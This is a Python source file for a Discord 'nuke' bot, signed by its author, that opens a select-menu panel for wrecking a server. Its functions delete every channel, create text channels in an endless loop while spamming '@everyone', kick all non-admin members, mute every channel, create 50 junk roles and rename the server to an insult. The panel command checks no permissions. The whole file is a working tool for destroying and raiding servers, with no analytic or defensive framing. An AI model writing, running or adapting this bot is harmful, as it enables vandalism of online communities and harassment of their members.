import discord
from discord.ext import commands
import asyncio
import random

try:
    from config import TOKEN, PREFIX, OWNER_ID
except ImportError:
    print("ERRO: 'config.py' nao encontrado... (TOKEN, PREFIX, etc.).")
    exit()

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)
nuke_states = {}

# ============================================================
#                     BY NECKK0. 
# ============================================================

class NukePanel(discord.ui.View):
    def __init__(self, guild: discord.Guild):
        super().__init__(timeout=None)
        self.guild = guild
        self.guild_id = guild.id

    @discord.ui.select(
        placeholder="Package fuctions by neckk0...",
        min_values=1,
        max_values=1,
        custom_id="painel_nuke_select",
        options=[
            discord.SelectOption(label="Nuke all (ALL)", description="Apaga tudo e spama.", emoji="🔥"),
            discord.SelectOption(label="Canais (NO END)", description="Criação infinita de canais.", emoji="📡"),
            discord.SelectOption(label="kicka (ALL)", description="Expulsa todos não-admin.", emoji="🧹"),
            discord.SelectOption(label="Mute (ALL)", description="Ninguém pode falar.", emoji="🔇"),
            discord.SelectOption(label="Delete (ALL)", description="Apaga todos os canais.", emoji="💣"),
            discord.SelectOption(label="Cargos (FOOL)", description="Cria 50 cargos.", emoji="🎭"),
        ]
    )
    async def select_callback(self, interaction: discord.Interaction, select: discord.ui.Select):
        selected = select.values[0]


        await interaction.response.send_message(
            f"Executando: **{selected}**",
            ephemeral=True
        )

        if selected == "Nuke all (ALL)":
            await self.full_nuke(interaction)

        elif selected == "Canais (NO END)":
            await self.channel_spam(interaction)

        elif selected == "kicka (ALL)":
            await self.kick_members(interaction)

        elif selected == "Mute (ALL)":
            await self.mute_server(interaction)

        elif selected == "Cargos (FOOL)":
            await self.role_flood(interaction)

        elif selected == "Delete (ALL)":
            await self.delete_all_channels(interaction)

    # ============================================================
    #             DELETE TODOS OS CANAIS (FIXED)
    # ============================================================

    async def delete_all_channels(self, interaction: discord.Interaction):
        guild = self.guild
        user = interaction.user

        try:
            await user.send(f"Iniciando exclusão de canais no servidor **{guild.name}**...")
        except:
            pass

        channels = list(guild.channels)
        total = len(channels)
        deleted = 0

        for ch in channels:
            try:
                await ch.delete(reason="Delete ALL")
                deleted += 1
            except:
                pass
            await asyncio.sleep(0.2)

        try:
            await user.send(f"Concluído: {deleted}/{total} canais deletados.")
        except:
            pass

    # ============================================================
    #                    NUKE COMPLETO (FIXED)
    # ============================================================

    async def full_nuke(self, interaction: discord.Interaction):
        guild = self.guild
        user = interaction.user
        nuke_states[self.guild_id] = True

        try:
            await guild.edit(
                name=f"{user.name} Fudendo seu server",
                reason="Nuke"
            )
        except:
            pass

    
        await self.delete_all_channels(interaction)
        await self.channel_spam(interaction)

    # ============================================================
    #                 SPAM INFINITO DE CANAIS (FIXED)
    # ============================================================

    async def channel_spam(self, interaction: discord.Interaction):
        guild = self.guild
        user = interaction.user

        try:
            await user.send("Iniciando spam infinito de canais...")
        except:
            pass

        count = 0
        while True:
            try:
                ch = await guild.create_text_channel(f"nuked-{count}", reason="SPAM")
                count += 1

                try:
                    for _ in range(3):
                        await ch.send("@everyone AHAHAHAHAHAHAHAHA")
                except:
                    pass

            except Exception as e:
                print(f"Erro no spam: {e}")

            await asyncio.sleep(0.3)

    # ============================================================
    #                           KICK ALL
    # ============================================================

    async def kick_members(self, interaction: discord.Interaction):
        guild = self.guild
        user = interaction.user

        members = [m for m in guild.members if not m.guild_permissions.administrator]

        try:
            await user.send(f"Expulsando {len(members)} membros...")
        except:
            pass

        kicked = 0

        for m in members:
            try:
                await m.kick(reason="Nuke")
                kicked += 1
            except:
                pass
            await asyncio.sleep(0.2)

        try:
            await user.send(f"Total expulsos: {kicked}")
        except:
            pass

    # ============================================================
    #                       MUTE GLOBAL
    # ============================================================

    async def mute_server(self, interaction: discord.Interaction):
        guild = self.guild
        user = interaction.user

        for ch in guild.channels:
            try:
                overwrite = ch.overwrites_for(guild.default_role)
                overwrite.send_messages = False
                overwrite.speak = False
                await ch.set_permissions(guild.default_role, overwrite=overwrite)
            except:
                pass

        try:
            await user.send("Servidor mutado.")
        except:
            pass

    # ============================================================
    #                      Cargos 
    # ============================================================

    async def role_flood(self, interaction: discord.Interaction):
        guild = self.guild
        user = interaction.user

        try:
            await user.send("Criando cargos...")
        except:
            pass

        for i in range(50):
            try:
                await guild.create_role(name=f"Nuked-{i}", reason="Flood")
            except:
                pass
            await asyncio.sleep(0.2)

        try:
            await user.send("Cargos criados.")
        except:
            pass


# ============================================================
#                     PAINEl
# ============================================================

@bot.command()
async def me(ctx):
    guild = ctx.guild
    panel = NukePanel(guild)

    await ctx.send("NUKE **(AIM)**\n```BY: neckk0```", view=panel)


# ============================================================
#                          ON READY
# ============================================================

@bot.event
async def on_ready():
    print(f"Bot online: {bot.user}")

    for guild in bot.guilds:
        bot.add_view(NukePanel(guild))

    print("Views carregadas.")


bot.run(TOKEN)
